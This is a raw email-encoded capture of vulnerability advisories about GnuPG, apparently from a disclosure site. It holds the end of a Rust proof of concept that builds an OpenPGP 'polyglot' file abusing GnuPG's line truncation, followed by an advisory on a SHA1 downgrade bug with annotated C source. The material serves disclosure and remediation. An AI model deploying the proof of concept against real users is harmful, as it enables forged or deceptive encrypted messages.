<span class=3D"line"><span style=3D"color:#E6EDF3">        after_sleds</spa=
n><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">appen=
d</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72"=
>&#x26;mut</span><span style=3D"color:#E6EDF3"> nop_sled</span><span style=
=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">clone</span><span =
style=3D"color:#E6EDF3">());</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text_long </s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> =
text</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8=
FF">clone</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    text_long</span><spa=
n style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">append</spa=
n><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26=
;mut</span><span style=3D"color:#E6EDF3"> after</span><span style=3D"color:=
#FF7B72">.</span><span style=3D"color:#D2A8FF">clone</span><span style=3D"c=
olor:#E6EDF3">());</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text_sleds </=
span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">=
 text</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A=
8FF">clone</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    text_sleds</span><sp=
an style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">append</sp=
an><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x2=
6;mut</span><span style=3D"color:#E6EDF3"> after_sleds</span><span style=3D=
"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">clone</span><span sty=
le=3D"color:#E6EDF3">());</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> crcd </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#E6EDF3"> &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> buf </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> ve=
c!</span><span style=3D"color:#E6EDF3">[];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#E6EDF3"> msg </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#FFA657"> Message</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#D2A8FF">new</span><span style=3D"color:#E6E=
DF3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"c=
olor:#E6EDF3"> buf);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> msg </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> Ar=
morer</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2=
A8FF">new</span><span style=3D"color:#E6EDF3">(msg)</span><span style=3D"co=
lor:#FF7B72">.</span><span style=3D"color:#D2A8FF">build</span><span style=
=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span sty=
le=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span><=
/span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> lit </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> Li=
teral</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2=
A8FF">new</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:=
#FFA657">Binary</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        lit</span><span =
style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">set_body</spa=
n><span style=3D"color:#E6EDF3">(text_sleds);</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">        Packet</span><sp=
an style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</spa=
n><span style=3D"color:#E6EDF3">(lit)</span><span style=3D"color:#FF7B72">.=
</span><span style=3D"color:#D2A8FF">serialize</span><span style=3D"color:#=
E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span style=
=3D"color:#E6EDF3"> msg)</span><span style=3D"color:#FF7B72">.</span><span =
style=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        msg</span><span =
style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">finalize</spa=
n><span style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</s=
pan><span style=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3=
">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buf</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> crcd </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#FFA657"> String</span><span style=3D"color:#FF7B72">::<=
/span><span style=3D"color:#D2A8FF">from_utf8</span><span style=3D"color:#E=
6EDF3">(crcd)</span><span style=3D"color:#FF7B72">.</span><span style=3D"co=
lor:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> lines </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> crcd=
</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">=
lines</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> start </span><span style=3D"color:#FF7B72">=3D</span><=
span style=3D"color:#E6EDF3"> lines</span><span style=3D"color:#FF7B72">.</=
span><span style=3D"color:#D2A8FF">next</span><span style=3D"color:#E6EDF3"=
>()</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8F=
F">unwrap</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> lines </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> line=
s</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF"=
>rev</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> end </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#E6EDF3"> lines</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">next</span><span style=3D"color:#E6EDF3">(=
)</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF"=
>unwrap</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> crc </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#E6EDF3"> lines</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">next</span><span style=3D"color:#E6EDF3">(=
)</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF"=
>unwrap</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text_long_lit=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA65=
7"> Literal</span><span style=3D"color:#FF7B72">::</span><span style=3D"col=
or:#D2A8FF">new</span><span style=3D"color:#E6EDF3">(</span><span style=3D"=
color:#FFA657">Binary</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    text_long_lit</span>=
<span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">set_bod=
y</span><span style=3D"color:#E6EDF3">(text_long);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text_long_pkt=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8F=
F"> vec!</span><span style=3D"color:#E6EDF3">[];</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(text_long_lit)</span><span style=3D"color:#FF7=
B72">.</span><span style=3D"color:#D2A8FF">serialize</span><span style=3D"c=
olor:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span s=
tyle=3D"color:#E6EDF3"> text_long_pkt)</span><span style=3D"color:#FF7B72">=
.</span><span style=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6=
EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text_long_b64=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA65=
7"> simple_base64</span><span style=3D"color:#FF7B72">::</span><span style=
=3D"color:#D2A8FF">encode</span><span style=3D"color:#E6EDF3">(text_long_pk=
t);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    text_long_b64</span>=
<span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">insert<=
/span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">2=
</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#A5D6FF"=
>'</span><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A=
5D6FF">'</span><span style=3D"color:#E6EDF3">); </span><span style=3D"color=
:#8B949E">// fix the off-by-two in GPG (it cuts off at 19998)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> after_sleds_b64 </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#FFA657"> simple_base64</span><span style=3D=
"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">encode</span><span s=
tyle=3D"color:#E6EDF3">(after_sleds);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> result </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#D2A8FF"> format!</span><span style=3D"color:#E6EDF3">=
(</span><span style=3D"color:#A5D6FF">"&#123;start&#125;</span><span style=
=3D"color:#FF7B72">&#92;n&#92;n</span><span style=3D"color:#A5D6FF">&#123;t=
ext_long_b64&#125;</span><span style=3D"color:#FF7B72">&#92;n</span><span s=
tyle=3D"color:#A5D6FF">&#123;after_sleds_b64&#125;</span><span style=3D"col=
or:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">&#123;crc&#125;</spa=
n><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">=
&#123;end&#125;"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">    std</span><span styl=
e=3D"color:#FF7B72">::</span><span style=3D"color:#FFA657">fs</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">write</span><=
span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"./polyg=
lot"</span><span style=3D"color:#E6EDF3">, result)</span><span style=3D"col=
or:#FF7B72">.</span><span style=3D"color:#D2A8FF">unwrap</span><span style=
=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    println!</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"./polyglot =
written. try:</span><span style=3D"color:#FF7B72">&#92;n&#92;t</span><span =
style=3D"color:#A5D6FF">gpg --decrypt ./polyglot</span><span style=3D"color=
:#FF7B72">&#92;n&#92;t</span><span style=3D"color:#A5D6FF">sq decrypt ./pol=
yglot"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">trait</span><span style=
=3D"color:#FFA657"> PadTo</span><span style=3D"color:#E6EDF3">&#x3C;</span>=
<span style=3D"color:#FFA657">I</span><span style=3D"color:#E6EDF3">> &#123=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    fn</span><span style=
=3D"color:#D2A8FF"> pad_to</span><span style=3D"color:#E6EDF3">(</span><spa=
n style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"color:#79C0FF"> se=
lf</span><span style=3D"color:#E6EDF3">, to</span><span style=3D"color:#FF7=
B72">:</span><span style=3D"color:#FFA657"> usize</span><span style=3D"colo=
r:#E6EDF3">, with</span><span style=3D"color:#FF7B72">:</span><span style=
=3D"color:#FFA657"> I</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">impl</span><span style=
=3D"color:#E6EDF3">&#x3C;</span><span style=3D"color:#FFA657">T</span><span=
 style=3D"color:#FF7B72">:</span><span style=3D"color:#FFA657"> Clone</span=
><span style=3D"color:#E6EDF3">> </span><span style=3D"color:#FFA657">PadTo=
</span><span style=3D"color:#E6EDF3">&#x3C;</span><span style=3D"color:#FFA=
657">T</span><span style=3D"color:#E6EDF3">> </span><span style=3D"color:#F=
F7B72">for</span><span style=3D"color:#FFA657"> Vec</span><span style=3D"co=
lor:#E6EDF3">&#x3C;</span><span style=3D"color:#FFA657">T</span><span style=
=3D"color:#E6EDF3">> &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    fn</span><span style=
=3D"color:#D2A8FF"> pad_to</span><span style=3D"color:#E6EDF3">(</span><spa=
n style=3D"color:#FF7B72">&#x26;mut</span><span style=3D"color:#79C0FF"> se=
lf</span><span style=3D"color:#E6EDF3">, to</span><span style=3D"color:#FF7=
B72">:</span><span style=3D"color:#FFA657"> usize</span><span style=3D"colo=
r:#E6EDF3">, with</span><span style=3D"color:#FF7B72">:</span><span style=
=3D"color:#FFA657"> T</span><span style=3D"color:#E6EDF3">) &#123;</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> padding <=
/span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"=
> vec!</span><span style=3D"color:#E6EDF3">[with; (to </span><span style=3D=
"color:#FF7B72">-</span><span style=3D"color:#79C0FF"> self</span><span sty=
le=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">len</span><span =
style=3D"color:#E6EDF3">() </span><span style=3D"color:#FF7B72">%</span><sp=
an style=3D"color:#E6EDF3"> to) </span><span style=3D"color:#FF7B72">%</spa=
n><span style=3D"color:#E6EDF3"> to];</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">append</span=
><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;=
mut</span><span style=3D"color:#E6EDF3"> padding);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <h2>Recommendation</h2> <p>To avoid vulnerabilities arisin=
g from divergent interpretations of the same RFC, all implementations shoul=
d strictly adhere to the specification. In particular, <em>GnuPG</em> shoul=
d not truncate overlong lines. When imposing reasonable restrictions (such =
as a maximum line length), an implementation must not ignore or truncate ex=
cessive input; instead, it should fail explicitly with an error.</p><!---->=
</article><!----><!----></main> <footer class=3D"bg-blue-500 p-4">contact: =
<a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemail=
=3D"7b1814150f1a180f3b1c0b1c551d1a1217">[email&#160;protected]</a></footer>=
<!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=3D"false" src=
=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></scri=
pt></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=us-ascii
Content-Disposition: attachment; filename="12-sha1.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>GnuPG may downgrade digest algorithm to SHA1 during key signature checking=
</h1> <!----><p><em>GnuPG</em> may downgrade the message digest algorithm t=
o insecure SHA1 algorithm during signature checking due to reading from uni=
nitialized memory.</p> <h2>Impact</h2> <p><code>check_signature_over_key_or=
_uid</code> can read from uninitialized memory which may lead to setting th=
e message digest algorithm to SHA1. This reduces the security of <a href=3D=
"https://datatracker.ietf.org/doc/html/rfc4880#section-5.2.4" rel=3D"nofoll=
ow"><em>User ID Certification Signatures</em></a> to that of SHA1. SHA1 suf=
fers from known cryptographic weaknesses like chosen prefix attacks.</p> <p=
>This affects the following calls to <code>check_signature_over_key_or_uid<=
/code>:</p> <ul><li>User ID certification signatures: <a href=3D"https://gi=
thub.com/gpg/gnupg/blob/master/g10/sig-check.c#L1260" rel=3D"nofollow">http=
s://github.com/gpg/gnupg/blob/master/g10/sig-check.c#L1260</a></li> <li>Pot=
entially this logic in the subkey binding code: <a href=3D"https://github.c=
om/gpg/gnupg/blob/master/g10/keylist.c#L2339" rel=3D"nofollow">https://gith=
ub.com/gpg/gnupg/blob/master/g10/keylist.c#L2339</a></li></ul> <h2>Details<=
/h2> <p>Cryptographic signatures are not computed over the message itself, =
but over an aggregated cryptographic hash of the message. This hash is know=
n as the <em>digest</em> (of the message). At the core of checking many kin=
ds of signatures in <em>GnuPG</em> is the function <code>check_signature_ov=
er_key_or_uid</code>. For the aforementioned signature types a call to <cod=
e>check_signature_over_key_or_uid</code> with both the parameters <code>is_=
selfsig</code> and <code>signer</code> being <code>NULL</code> is possible.=
 This can lead to the following:</p> <ul><li>[1.1], [1.1] <code>is_selfsig<=
/code> will point to uninitialized stack memory</li> <li>[2] <code>*is_self=
sig</code> is never written to</li> <li>[3] <code>*is_selfsig</code> is rea=
d in the condition that should disallow the weak SHA1 algorithm, except for=
 self signatures. However, <code>*is_selfsig</code> can be any value at thi=
s point since it is uninitialized. Any value other than 0 will lead to skip=
ping this crucial check.</li></ul> <!----><pre class=3D"shiki github-dark-d=
efault" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><co=
de><span class=3D"line"><span style=3D"color:#8B949E">/* Returns whether SI=
GNER generated the signature SIG over the packet</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * PACKET, which is a ke=
y, subkey or uid, and comes from the key block</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * KB.  (KB is PACKET's =
corresponding keyblock; we don't assume that</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * SIG has been added to=
 the keyblock.)</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If SIGNER is set, the=
n checks whether SIGNER generated the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * signature.  Otherwise=
, uses SIG->KEYID to find the alleged signer.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * This parameter can be=
 used to effectively override the alleged</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * signer that is stored=
 in SIG.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * KB may be NULL if SIG=
NER is set.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Unlike check_key_sign=
ature, this function ignores any cached</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * results!  That is, it=
 does not consider SIG->FLAGS.CHECKED and</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * SIG->FLAGS.VALID nor =
does it set them.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * This doesn't check th=
e signature's semantic mean.  Concretely, it</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * doesn't check whether=
 a non-self signed revocation signature was</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * created by a designat=
ed revoker.  In fact, it doesn't return an</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * error for a binding g=
enerated by a completely different key!</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Returns 0 if the sign=
ature is valid.  Returns GPG_ERR_SIG_CLASS if</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * this signature can't =
be over PACKET.  Returns GPG_ERR_NOT_FOUND if</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * the key that generate=
d the signature (according to SIG) could not</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * be found.  Returns GP=
G_ERR_BAD_SIGNATURE if the signature is bad.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Other errors codes ma=
y be returned if something else goes wrong.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * IF IS_SELFSIG is not =
NULL, sets *IS_SELFSIG to 1 if this is a</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * self-signature (by th=
e key's primary key) or 0 if not.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * If RET_PK is not NULL=
, returns a copy of the public key that</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * generated the signatu=
re (i.e., the signer) on success.  This must</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * be released by the ca=
ller using release_public_key_parts ().  */</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">gpg_error_t</span><span =
style=3D"color:#D2A8FF"> check_signature_over_key_or_uid</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">ctrl_t</span><span=
 style=3D"color:#FFA657"> ctrl</span><span style=3D"color:#E6EDF3">, PKT_pu=
blic_key</span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#=
FFA657"> signer</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
                    PKT_signature</span><span style=3D"color:#FF7B72">*</sp=
an><span style=3D"color:#FFA657"> sig</span><span style=3D"color:#E6EDF3">,=
 KBNODE </span><span style=3D"color:#FFA657">kb</span><span style=3D"color:=
#E6EDF3">, PACKET</span><span style=3D"color:#FF7B72">*</span><span style=
=3D"color:#FFA657"> packet</span><span style=3D"color:#E6EDF3">,</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
                    int*</span><span style=3D"color:#FFA657"> is_selfsig</s=
pan><span style=3D"color:#E6EDF3">, PKT_public_key</span><span style=3D"col=
or:#FF7B72">*</span><span style=3D"color:#FFA657"> ret_pk</span><span style=
=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  int</span><span style=
=3D"color:#E6EDF3"> stub_is_selfsig;</span><span style=3D"color:#8B949E"> /=
/ &#x3C;-- [1.1]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">is_selfsig) is_selfsig </span><span style=3D"color:#FF=
7B72">=3D</span><span style=3D"color:#FF7B72"> &#x26;</span><span style=3D"=
color:#E6EDF3">stub_is_selfsig;</span><span style=3D"color:#8B949E"> // &#x=
3C;-- [1.2]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (signer) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* Get the signer.  =
If possible, avoid a look up.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (sig->keyid[</span><span style=3D"color:#79C0FF">0</spa=
n><span style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=3D=
=3D</span><span style=3D"color:#E6EDF3"> pripk->keyid[</span><span style=3D=
"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      &#x26;&#x26;</span=
><span style=3D"color:#E6EDF3"> sig->keyid[</span><span style=3D"color:#79C=
0FF">1</span><span style=3D"color:#E6EDF3">] </span><span style=3D"color:#F=
F7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> pripk->keyid[</span><spa=
n style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">]) &#123;</=
span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      // ...</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125; </span><span =
style=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</s=
pan><span style=3D"color:#8B949E"> // &#x3C;-- [2]</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* See if one of t=
he subkeys was the signer (although this</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">       * is extremely un=
likely).  */</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">      kbnode_t</span><sp=
an style=3D"color:#E6EDF3"> ctx </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> NULL</span><span style=3D"color:#E6EDF3"=
>;</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">      kbnode_t</span><sp=
an style=3D"color:#E6EDF3"> n;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      while</span><span =
style=3D"color:#E6EDF3"> ((n </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#D2A8FF"> walk_kbnode</span><span style=3D"color:#E6E=
DF3">(kb, </span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"=
color:#E6EDF3">ctx, </span><span style=3D"color:#79C0FF">0</span><span styl=
e=3D"color:#E6EDF3">))) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        PKT_public_key</=
span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#E6EDF3"> s=
ubk;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (n->pkt->pkttype </span><span style=3D"color:#FF7B7=
2">!=3D</span><span style=3D"color:#E6EDF3"> PKT_PUBLIC_SUBKEY) </span><spa=
n style=3D"color:#FF7B72">continue</span><span style=3D"color:#E6EDF3">;</s=
pan></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        subk </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> n->pkt->=
pkt.public_key;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (sig->keyid[</span><span style=3D"color:#79C0FF">0<=
/span><span style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=
=3D=3D</span><span style=3D"color:#E6EDF3"> subk->keyid[</span><span style=
=3D"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">]</span></span>
